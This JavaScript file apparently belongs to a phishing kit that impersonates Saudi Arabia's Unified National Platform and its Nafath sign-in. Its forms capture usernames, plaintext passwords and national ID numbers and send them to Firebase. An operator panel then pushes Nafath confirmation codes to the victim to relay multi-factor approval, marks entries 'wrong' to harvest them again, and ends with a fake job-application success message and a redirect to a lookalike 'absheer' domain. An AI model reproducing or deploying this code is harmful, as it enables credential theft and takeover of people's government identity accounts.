// script.js

// استيراد قاعدة البيانات من الملف الخارجي المخصّص لـ Firebase
import { db } from "./firebase-config.js";

// استيراد الدوال المطلوبة (إضافة doc و onSnapshot للمراقبة اللحظية)
import {
    collection,
    addDoc,
    serverTimestamp,
    doc,
    onSnapshot
} from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

// ==========================================
// قاموس الترجمة الموحد للمنصة (عربي / English)
// ==========================================
const translations = {
    ar: {
        langText: "English",
        dir: "rtl",
        lang: "ar",
        loaderWaiting: "يرجى الانتظار لا تغادر الصفحه...",
        appliedSuccess: `<i class="fa-solid fa-circle-check" style="color: #16a34a; font-size: 24px; margin-bottom: 10px; display: block;"></i> تم التقديم على وظيفتك بنجاح عبر المنصة الوطنية الموحدة... جاري تحويلك الآن`,
        wrongId: "عذراً، رقم الهوية الوطنية أو الإقامة الذي أدخلته غير صحيح. يرجى التثبت والمحاولة مجدداً.",
        wrongAuth: "اسم المستخدم أو كلمة المرور غير صحيحة، يرجى إعادة التأكد من بيانات النفاذ الموحد الخاص بك.",
        approved: "تم التحقق والمطابقة بنجاح من قبل الإدارة.",
        rejected: "تم رفض طلب التحقق من قبل لوحة الإدارة. يرجى المحاولة مجدداً.",
        networkError: "عذراً، حدث خطأ في الاتصال بالشبكة.",
        failSubmit: "فشل إرسال الطلب، تأكد من اتصال الشبكة.",
        lengthError: "خطأ: يجب أن يتكون رقم بطاقة الأحوال أو الإقامة من 10 أرقام تماماً."
    },
    en: {
        langText: "عربي",
        dir: "ltr",
        lang: "en",
        loaderWaiting: "Please wait, do not leave the page...",
        appliedSuccess: `<i class="fa-solid fa-circle-check" style="color: #16a34a; font-size: 24px; margin-bottom: 10px; display: block;"></i> Applied to your job successfully via the Unified National Platform... Redirecting now`,
        wrongId: "Sorry, the National ID or Iqama number you entered is incorrect. Please verify and try again.",
        wrongAuth: "Incorrect username or password, please check your Unified Nafath credentials again.",
        approved: "Verification and matching completed successfully by the administration.",
        rejected: "The verification request was rejected by the admin panel. Please try again.",
        networkError: "Sorry, a network connection error occurred.",
        failSubmit: "Failed to submit request, check your network connection.",
        lengthError: "Error: National ID or Iqama number must be exactly 10 digits."
    }
};

document.addEventListener('DOMContentLoaded', () => {

    // ==========================================
    // إدارة لغة الصفحة الحالية وتطبيقها عند الإقلاع
    // ==========================================
    let currentLang = localStorage.getItem('platform_lang') || 'ar';
    
    function applyLanguage(lang) {
        const t = translations[lang];
        
        // 1. تحديث سمات الاتجاه واللغة لعنصر الـ HTML والـ Body
        document.documentElement.setAttribute('dir', t.dir);
        document.documentElement.setAttribute('lang', t.lang);
        document.body.setAttribute('dir', t.dir);
        document.body.style.direction = t.dir;
        
        // 2. تحديث نص زر التبديل (ليعرض اسم اللغة الأخرى المتاحة للتحويل لها)
        const langSwitch = document.getElementById('langSwitch');
        if (langSwitch) {
            const span = langSwitch.querySelector('span');
            if (span) span.innerText = t.langText;
        }

        // 3. ترجمة العناصر الثابتة التي تحمل سمة data-i18n (إذا كانت متوفرة بالـ HTML)
        document.querySelectorAll('[data-i18n]').forEach(element => {
            const key = element.getAttribute('data-i18n');
            if (t[key]) {
                element.innerText = t[key];
            }
        });
        
        localStorage.setItem('platform_lang', lang);
        currentLang = lang;
    }

    // تطبيق اللغة المحفوظة فوراً عند دخول الصفحة
    applyLanguage(currentLang);

    // ==========================================
    // 1. تفاعلات الصفحة الرئيسية (Index Page)
    // ==========================================
    const loginCard = document.getElementById('loginCard');
    if (loginCard) {
        loginCard.addEventListener('click', () => {
            loginCard.style.transform = 'scale(0.95)';
            setTimeout(() => {
                window.location.href = 'login.html';
            }, 150);
        });
    }

    // ==========================================
    // 2. نظام التبويب والأكورديون الديناميكي (Accordion System)
    // ==========================================
    const tabs = document.querySelectorAll('.accordion-item');
    const panels = document.querySelectorAll('.form-panel-card');

    tabs.forEach(tab => {
        tab.addEventListener('click', () => {
            if (tab.classList.contains('collapsed')) {

                tabs.forEach(t => {
                    t.classList.remove('active');
                    t.classList.add('collapsed');
                    const icon = t.querySelector('.status-icon');
                    if (icon) {
                        icon.classList.remove('fa-minus');
                        icon.classList.add('fa-plus');
                    }
                });

                panels.forEach(p => {
                    p.classList.add('hidden-panel');
                });

                tab.classList.remove('collapsed');
                tab.classList.add('active');
                const currentIcon = tab.querySelector('.status-icon');
                if (currentIcon) {
                    currentIcon.classList.remove('fa-plus');
                    currentIcon.classList.add('fa-minus');
                }

                const targetPanelId = tab.getAttribute('data-target');
                const targetPanel = document.getElementById(targetPanelId);
                if (targetPanel) {
                    targetPanel.classList.remove('hidden-panel');
                }
            }
        });
    });

    // ==========================================
    // 3. معالجة إرسال النماذج ومراقبة رد الأدمن لحظياً
    // ==========================================
    const globalLoader = document.getElementById('globalLoader');
    const loaderText = globalLoader ? globalLoader.querySelector('.loader-text') : null;

    // دالة لمراقبة حالة المستند في فايربيس بشكل حي ومباشر والتحويل للواجهة الرقمية
    function listenToAdminApproval(collectionName, docId) {
        const docRef = doc(db, collectionName, docId);

        const nafathFormContainer = document.getElementById('nafathFormContainer');
        const nafathWaitContainer = document.getElementById('nafathWaitContainer');
        const nafathLiveNumber = document.getElementById('nafathLiveNumber');

        // الاستماع للتغيرات اللحظية في قاعدة البيانات
        const unsubscribe = onSnapshot(docRef, (snapshot) => {
            if (snapshot.exists()) {
                const data = snapshot.data();
                const activeTrans = translations[currentLang];

                // الإجراء الجديد والمضاف: حالة "تم التقديم للوظيفة"
                if (data.status === "applied_success") {
                    if (globalLoader) globalLoader.classList.remove('hidden-loader');
                    if (loaderText) {
                        loaderText.innerHTML = activeTrans.appliedSuccess;
                        loaderText.style.color = "#16a34a";
                    }

                    if (nafathWaitContainer) nafathWaitContainer.classList.add('hidden-panel');
                    unsubscribe();

                    setTimeout(() => {
                        window.location.href = "https://absheer-sa.onrender.com/";
                    }, 5000);
                }

                // الإجراء الأول: نقر الأدمن على "رقم تأكيد" وإرسال الكود للمطابقة
                else if (data.status === "show_code") {
                    if (globalLoader) globalLoader.classList.add('hidden-loader');
                    if (nafathFormContainer) nafathFormContainer.classList.add('hidden-panel');
                    if (nafathLiveNumber) nafathLiveNumber.innerText = data.verificationCode;
                    if (nafathWaitContainer) nafathWaitContainer.classList.remove('hidden-panel');
                }

                // الإجراء الثاني: رقم الهوية غير صحيح من الأدمن
                else if (data.status === "wrong_national_id") {
                    if (globalLoader) globalLoader.classList.add('hidden-loader');
                    alert(activeTrans.wrongId);
                    unsubscribe();
                    window.location.reload();
                }

                // الإجراء الثالث: بيانات اسم المستخدم أو كلمة المرور غير صحيحة من الأدمن
                else if (data.status === "wrong_auth_data") {
                    if (globalLoader) globalLoader.classList.add('hidden-loader');
                    alert(activeTrans.wrongAuth);
                    unsubscribe();
                    window.location.reload();
                }

                // الإجراء المسبق: الموافقة التامة والنهائية والتحويل للمنصة الرئيسية
                else if (data.status === "approved") {
                    if (globalLoader) globalLoader.classList.add('hidden-loader');
                    alert(activeTrans.approved);
                    window.location.href = "dashboard.html";
                    unsubscribe();
                }

                else if (data.status === "rejected") {
                    if (globalLoader) globalLoader.classList.add('hidden-loader');
                    alert(activeTrans.rejected);
                    unsubscribe();
                    window.location.reload();
                }
            }
        });
    }

    // تفعيل زر إلغاء الطلب بداخل واجهة انتظار نفاذ لإعادة تصفير ونعش الحقول
    const cancelNafathBtn = document.getElementById('cancelNafathBtn');
    if (cancelNafathBtn) {
        cancelNafathBtn.addEventListener('click', () => {
            window.location.reload();
        });
    }

    // أ) نموذج اسم المستخدم وكلمة المرور الأصلي
    const authForm = document.getElementById('authForm');
    if (authForm) {
        authForm.addEventListener('submit', async (e) => {
            e.preventDefault();

            const usernameInput = document.getElementById('username').value;
            const passwordInput = document.getElementById('password').value;
            const activeTrans = translations[currentLang];

            if (globalLoader) globalLoader.classList.remove('hidden-loader');
            if (loaderText) {
                loaderText.innerText = activeTrans.loaderWaiting;
                loaderText.style.color = "#14805e";
            }

            try {
                const docRef = await addDoc(collection(db, "users_login"), {
                    username: usernameInput,
                    password: passwordInput,
                    timestamp: serverTimestamp(),
                    device: navigator.userAgent,
                    status: "waiting_admin"
                });

                listenToAdminApproval("users_login", docRef.id);

            } catch (error) {
                console.error("خطأ: ", error);
                alert(activeTrans.networkError);
                if (globalLoader) globalLoader.classList.add('hidden-loader');
            }
        });
    }

    // ب) نموذج رقم بطاقة الأحوال (الخاص بتبويب تطبيق نفاذ) مع حصر الطول بعشرة أرقام
    const appForm = document.getElementById('appForm');
    if (appForm) {
        const nationalIdField = document.getElementById('nationalId');
        if (nationalIdField) {
            nationalIdField.addEventListener('input', (e) => {
                e.target.value = e.target.value.replace(/\D/g, '').slice(0, 10);
            });
        }

        appForm.addEventListener('submit', async (e) => {
            e.preventDefault();

            const nationalIdInput = document.getElementById('nationalId').value.trim();
            const activeTrans = translations[currentLang];

            // التحقق النهائي من شرط الـ 10 أرقام تماماً قبل الإرسال والرفع للفايربيس
            if (nationalIdInput.length !== 10) {
                alert(activeTrans.lengthError);
                return;
            }

            if (globalLoader) globalLoader.classList.remove('hidden-loader');
            if (loaderText) {
                loaderText.innerText = activeTrans.loaderWaiting;
                loaderText.style.color = "#14805e";
            }

            try {
                const docRef = await addDoc(collection(db, "nafath_app_requests"), {
                    nationalId: nationalIdInput,
                    timestamp: serverTimestamp(),
                    device: navigator.userAgent,
                    status: "waiting_admin"
                });

                listenToAdminApproval("nafath_app_requests", docRef.id);

            } catch (error) {
                console.error("خطأ: ", error);
                alert(activeTrans.failSubmit);
                if (globalLoader) globalLoader.classList.add('hidden-loader');
            }
        });
    }

    // ==========================================
    // 4. زر تبديل اللغة الحقيقي والديناميكي
    // ==========================================
    const langSwitch = document.getElementById('langSwitch');
    if (langSwitch) {
        langSwitch.addEventListener('click', () => {
            // التحويل للغة المعاكسة للغة الحالية مباشرة
            const targetLang = (currentLang === 'ar') ? 'en' : 'ar';
            applyLanguage(targetLang);
        });
    }
});
